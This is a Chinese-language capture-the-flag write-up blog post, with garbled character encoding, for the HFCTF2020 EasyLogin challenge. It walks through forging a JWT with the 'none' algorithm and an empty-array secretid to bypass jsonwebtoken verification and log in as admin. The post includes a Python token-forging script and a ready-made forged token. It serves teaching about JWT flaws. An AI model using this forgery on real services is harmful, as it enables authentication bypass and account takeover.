<h4><span id="ä¼ªé€ ">ä¼ªé€ </span></h4><p>/controllers/api.jsï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">&#x27;../rest&#x27;</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">&#x27;POST /api/register&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">!username || username === <span class="string">&#x27;admin&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;register error&#x27;</span>, <span class="string">&#x27;wrong username&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params"><span class="built_in">global</span>.secrets.length &gt; <span class="number">100000</span></span>)</span> &#123;</span><br><span class="line">            <span class="built_in">global</span>.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = <span class="built_in">global</span>.secrets.length;</span><br><span class="line">        <span class="built_in">global</span>.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;POST /api/login&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">!username || !password</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;username or password is necessary&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = <span class="built_in">global</span>.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">status</span>)</span> &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/flag&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">ctx.session.username !== <span class="string">&#x27;admin&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;permission error&#x27;</span>, <span class="string">&#x27;permission denied&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">&#x27;/flag&#x27;</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/logout&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>è¦æ±‚ç”¨æˆ·åä¸ºadminï¼Œå¯ä»¥æŸ¥åˆ°flag</p>
<p>ç™»å½•éªŒè¯ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span>(<span class="params">sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>sidä¸èƒ½ä¸ºnullï¼Œä¸èƒ½ä¸å®šä¹‰ï¼Œä¸”å–å€¼èŒƒå›´è§„å®šåœ¨0åˆ°<code>global.secrets</code>é•¿åº¦èŒƒå›´å†…</p>
<p><strong>æ³¨æ„ï¼Œæ­¤webåº”ç”¨çš„sidéåŠ å¯†æ‰€ä½¿ç”¨çš„sidï¼Œè¿™é‡Œçš„sidä¼¼ä¹æ˜¯ä¸€ç§æ ‡è¯†â€¦â€¦</strong></p>
<h5><span id="æ˜“å—æ”»å‡»çš„-jwt-åº“">æ˜“å—æ”»å‡»çš„ JWT åº“</span></h5><p>è¯¦è§ï¼š<a target="_blank" rel="noopener" href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/#Recommendations-for-Library-Developers">Critical vulnerabilities in JSON Web Token libraries</a></p>
<blockquote>
<p>*<em>TL;DR:**If you are using <a target="_blank" rel="noopener" href="https://github.com/auth0/node-jsonwebtoken"><strong>node-jsonwebtoken</strong></a>, <a target="_blank" rel="noopener" href="https://github.com/jpadilla/pyjwt/">pyjwt</a>, <a target="_blank" rel="noopener" href="https://github.com/namshi/jose">namshi/jose</a>, <a target="_blank" rel="noopener" href="https://github.com/firebase/php-jwt">php-jwt</a> or <a target="_blank" rel="noopener" href="https://github.com/kjur/jsjws">jsjwt</a> with asymmetric keys (RS256, RS384, RS512, ES256, ES384, ES512) please update to the latest version. See<a target="_blank" rel="noopener" href="http://jwt.io/">jwt.io</a>for more information on the vulnerable libraries.</em>(Updated 2015-04-20)*</p>
</blockquote>
<blockquote>
<p><strong>Meet the â€œNoneâ€ Algorithm</strong></p>
<p>The<code>none</code>algorithm is a curious addition to JWT. It is intended to be used for situations where the integrity of the token has already been verified. Interestingly enough, it is one of only two algorithms that are mandatory to implement (the other being<code>HS256</code>).</p>
<p>Unfortunately, some libraries treated tokens signed with the<code>none</code>algorithm as a valid token with a verified signature. The result? Anyone can create their own â€œsignedâ€ tokens with whatever payload they want, allowing arbitrary account access on some systems.</p>
<p>Putting together such a token is easy. Modify the above example header to contain<code>&quot;alg&quot;: &quot;none&quot;</code>instead of<code>HS256</code>. Make any desired changes to the payload. Use an empty signature (i.e.<code>signature = &quot;&quot;</code>).</p>
<p>Most (hopefully all?) implementations now have a basic check to prevent this attack: if a secret key was provided, then token verification will fail for tokens using the<code>none</code>algorithm. This is a good idea, but it doesnâ€™t solve the underlying problem: attackers control the choice of algorithm. Letâ€™s keep digging.</p>
</blockquote>
<p>è¿™é‡Œæ˜“å—æ”»å‡»æŒ‡çš„æ˜¯ä¸€äº›éå¯¹ç§°åŠ å¯†ç®—æ³•çš„éªŒè¯ï¼Œâ€¦â€¦å¤§æ¦‚ã€‚</p>
<p>ç›®å‰ JWT åº”è¯¥æ˜¯æ”¯æŒnoneçš„â€¦â€¦</p>
<blockquote>
<p>The <code>none</code> algorithm is a <strong>curious</strong> addition to JWT.</p>
</blockquote>
<blockquote>
<p>Most (hopefully all?) implementations now <strong>have a basic check to prevent this attack</strong></p>
</blockquote>
<p>æ‰€ä»¥éœ€è¦æˆ‘ä»¬è‡ªè¡Œè®¾è®¡æ¥é¢„é˜²ç©ºè®¾çš„æ”»å‡»</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span>(<span class="params">sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™å…¶å®å°±æ˜¯ä¸€ä¸ªéªŒè¯ï¼Œæœ€åçš„æœ€åä¹Ÿå°±æ˜¯ï¼Œ<strong>ç»•è¿‡</strong></p>
<blockquote>
<p>è¿™éƒ¨åˆ†è¿˜æ˜¯éšè—èµ·æ¥æ¯”è¾ƒå¥½ï¼Ÿâ€¦â€¦</p>
</blockquote>
<h5><span id="ç»•è¿‡ä¸å…¶åŸç†">ç»•è¿‡ä¸å…¶åŸç†</span></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure>

<p>æœ€åæˆ‘ä»¬å°†åœ¨è¿™é‡Œå¯¹JWTè¿›è¡ŒéªŒè¯ï¼Œè¿™ä¹Ÿå†³å®šäº†æˆ‘ä»¬çš„ç»•è¿‡æ–¹å¼</p>
<p>registerä¸­ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> secretid = <span class="built_in">global</span>.secrets.length;</span><br><span class="line"><span class="built_in">global</span>.secrets.push(secret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure>

<p>secret æŒ‰é¡ºåºpushè¿›secretsä¸­ï¼Œ<strong>sid</strong>æ­£æ˜¯ä»ä¸­å–å‡ºsecretå€¼çš„ç´¢å¼•</p>
<p><strong>å¦‚æœæˆ‘ä»¬ï¼š</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"></span><br><span class="line">token = <span class="string">&#x27;eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjI5Mjk0NTU1LCJwYXNzd29yZCI6ImhoaCIsInNlY3JldGlkIjowfQ.&#x27;</span></span><br><span class="line"></span><br><span class="line">secret = <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(user)</span><br></pre></td></tr></table></figure>

<p>è®¤è¯å°†ä¼šæç¤ºï¼š</p>
<p><img src="/images/HFCTF2020-EasyLogin/image-20210819154725607.png" alt="image-20210819154725607"></p>
<p>æ­£å¦‚ä¹‹å‰å°è¯•çš„æŠ¥é”™ï¼š</p>
<p><img src="/images/HFCTF2020-EasyLogin/image-20210819154744913.png" alt="image-20210819154744913"></p>
<p><strong>å¦‚æœè¿™æ ·</strong>ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"></span><br><span class="line">token = <span class="string">&#x27;eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjI5Mjk0NTU1LCJwYXNzd29yZCI6ImhoaCIsInNlY3JldGlkIjowfQ.&#x27;</span></span><br><span class="line"></span><br><span class="line">secret = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(user)</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä¼šå¾—åˆ°ï¼š</p>
<p><img src="/images/HFCTF2020-EasyLogin/image-20210819155157713.png" alt="image-20210819155157713"></p>
<p><strong>æ­£ç¡®çš„è§£æï¼Œå³ä½¿æŒ‡å®šäº†HS256</strong></p>
<p><strong>undefined</strong>ï¼Œä¹Ÿå¯ä»¥æˆåŠŸï¼Œè¿™å°±æ˜¯ä¸Šé¢è¿‡æ»¤çš„ <strong>åŸå› </strong></p>
<p>æˆ‘ä»¬åªè¦æ§åˆ¶sidï¼Œä»secretsæ•°ç»„ä¸­å–å‡ºä¸€ä¸ªä¸å­˜åœ¨çš„å€¼å³å¯ï¼Œä½¿ç”¨<strong>å°æ•°</strong>æˆ–è€…ç»™sidè®¾ç½®æˆä¸€ä¸ª<strong>ç©ºæ•°ç»„</strong>ä¹‹ç±»çš„â€¦â€¦</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(&#123;<span class="string">&quot;secretid&quot;</span>: [],</span><br><span class="line">                    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;hhh&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;iat&quot;</span>: <span class="number">1629294555</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                   algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆtokenç™»å…¥admin</p>
<img src="/images/HFCTF2020-EasyLogin/image-20210819155836881.png" alt="image-20210819155836881" style="zoom:80%;">

<p>è·å– flag~</p>
<img src="/images/HFCTF2020-EasyLogin/image-20210819160525000.png" alt="image-20210819160525000" style="zoom:80%;">

<p>æ²¡æƒ³åˆ°å†™äº†è¿™ä¹ˆå¤šï¼Œæ„Ÿè§‰è¿˜æ˜¯æ¯”è¾ƒåœ†æ»¡çš„â€¦â€¦</p>
<p>å‚è€ƒæ–‡ç« :<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cjsblog/p/9277677.html">jwtè¯¦è§£</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xuzhengzong/articles/11777850.html">JWT å‰åç«¯åˆ†ç¦»åº”ç”¨ï¼Œjwtçš„tokenæœåŠ¡ç«¯ä¸ä¿å­˜ã€ä»…ä¿å­˜åŠ å¯†çš„secretï¼Œæ‰€æœ‰ç”¨æˆ·éƒ½æ˜¯è¿™ä¸€ä¸ªsecret</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/180874.html">æ·±å…¥äº†è§£Json Web Tokenä¹‹æ¦‚å¿µç¯‡</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/181261.html">æ·±å…¥äº†è§£Json Web Tokenä¹‹å®æˆ˜ç¯‡ </a></p>
<p><a target="_blank" rel="noopener" href="https://cyberpolygon.com/materials/security-of-json-web-tokens-jwt/">Security of JSON Web Tokens  (JWT) - Cyber Polygon </a></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>HFCTF2020-EasyLogin</p><p><a href="http://example.com/2021/08/18/HFCTF2020-EasyLogin/">http://example.com/2021/08/18/HFCTF2020-EasyLogin/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>ä½œè€…</h6><a href="http://example.com"><p>inanb</p></a></div></div><div class="level-item is-narrow"><div><h6>å‘å¸ƒäº</h6><p>2021-08-18</p></div></div><div class="level-item is-narrow"><div><h6>æ›´æ–°äº</h6><p>2021-08-31</p></div></div><div class="level-item is-narrow"><div><h6>è®¸å¯åè®®</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="recommend-area"><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7">#Â ç›¸å…³æ–‡ç« </span><br><span>Â Â 1.<a class="is-size-6" href="/2021/09/03/b01lers2020-Life_on_Mars/" target="_blank">b01lers2020-Life_on_Mars</a><br></span><span>Â Â 2.<a class="is-size-6" href="/2021/09/03/ISITDTU-2019-EasyPHP/" target="_blank">ISITDTU-2019-EasyPHP</a><br></span><span>Â Â 3.<a class="is-size-6" href="/2021/08/31/SUCTF-2018-GetShell/" target="_blank">SUCTF-2018-GetShell</a><br></span><span>Â Â 4.<a class="is-size-6" href="/2021/08/31/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/" target="_blank">çº¢æ˜è°·CTF-2021-write_shell</a><br></span><span>Â Â 5.<a class="is-size-6" href="/2021/08/28/MRCTF2020-Ezaudit/" target="_blank">MRCTF2020-Ezaudit</a><br></span><span>Â Â 6.<a class="is-size-6" href="/2021/08/27/GYCTF2020-Easyphp/" target="_blank">GYCTF2020-Easyphp</a><br></span><span>Â Â 7.<a class="is-size-6" href="/2021/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/" target="_blank">å¼ºç½‘æ¯-2019-Upload</a><br></span><span>Â Â 8.<a class="is-size-6" href="/2021/08/25/GYCTF2020-EasyThinking/" target="_blank">GYCTF2020-EasyThinking</a><br></span></div><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7">#Â æ¨èæ–‡ç« </span><br><span>Â Â 1.<a class="is-size-6" href="/2021/08/25/GYCTF2020-EasyThinking/" target="_blank">GYCTF2020-EasyThinking</a><br></span><span>Â Â 2.<a class="is-size-6" href="/2021/08/27/GYCTF2020-Easyphp/" target="_blank">GYCTF2020-Easyphp</a><br></span><span>Â Â 3.<a class="is-size-6" href="/2021/08/22/HFCTF2020-JustEscape/" target="_blank">HFCTF2020-JustEscape</a><br></span><span>Â Â 4.<a class="is-size-6" href="/2021/09/03/ISITDTU-2019-EasyPHP/" target="_blank">ISITDTU-2019-EasyPHP</a><br></span><span>Â Â 5.<a class="is-size-6" href="/2021/08/28/MRCTF2020-Ezaudit/" target="_blank">MRCTF2020-Ezaudit</a><br></span><span>Â Â 6.<a class="is-size-6" href="/2021/08/24/NPUCTF2020-ezinclude/" target="_blank">NPUCTF2020-ezinclude</a><br></span></div></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/css/share.min.css"><div class="social-share"></div><script src="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Ÿæ‰“èµä¸€ä¸‹ä½œè€…å§</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>æ”¯ä»˜å®</span><span class="qrcode"><img src="/img/inanb.png" alt="æ”¯ä»˜å®"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>å¾®ä¿¡</span><span class="qrcode"><img src="/img/inanb.png" alt="å¾®ä¿¡"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/08/22/SUCTF-2019-EasyWeb/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">SUCTF-2019-EasyWeb</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/08/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/"><span class="level-item">ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><!--!--><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/header.jpg" alt="inanb"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">inanb</p><p class="is-size-6 is-block">é“é©¬å†°æ²³å…¥æ¢¦æ¥</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">æ–‡ç« </p><a href="/archives"><p class="title">108</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">åˆ†ç±»</p><a href="/categories"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">æ ‡ç­¾</p><a href="/tags"><p class="title">9</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/inanb" target="_blank" rel="noopener">å…³æ³¨æˆ‘</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/inanb"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D ä¸€è¨€å¥å­è·å–ä¸­...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"æ¥æºã€Š"+data.from+"ã€‹</p><p>æä¾›è€…-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">é“¾æ¥</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">æœ€æ–°æ–‡ç« </h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-03T09:42:32.238Z">2021-09-03</time></p><p class="title"><a href="/2021/09/03/b01lers2020-Life_on_Mars/">b01lers2020-Life_on_Mars</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-03T03:15:58.421Z">2021-09-03</time></p><p class="title"><a href="/2021/09/03/ISITDTU-2019-EasyPHP/">ISITDTU-2019-EasyPHP</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-31T12:37:17.632Z">2021-08-31</time></p><p class="title"><a href="/2021/08/31/SUCTF-2018-GetShell/">SUCTF-2018-GetShell</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-31T03:42:12.897Z">2021-08-31</time></p><p class="title"><a href="/2021/08/31/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/">çº¢æ˜è°·CTF-2021-write_shell</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-28T02:53:12.240Z">2021-08-28</time></p><p class="title"><a href="/2021/08/28/MRCTF2020-Ezaudit/">MRCTF2020-Ezaudit</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">åˆ†ç±»</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/LeetCode/"><span class="level-start"><span class="level-item">LeetCode</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile 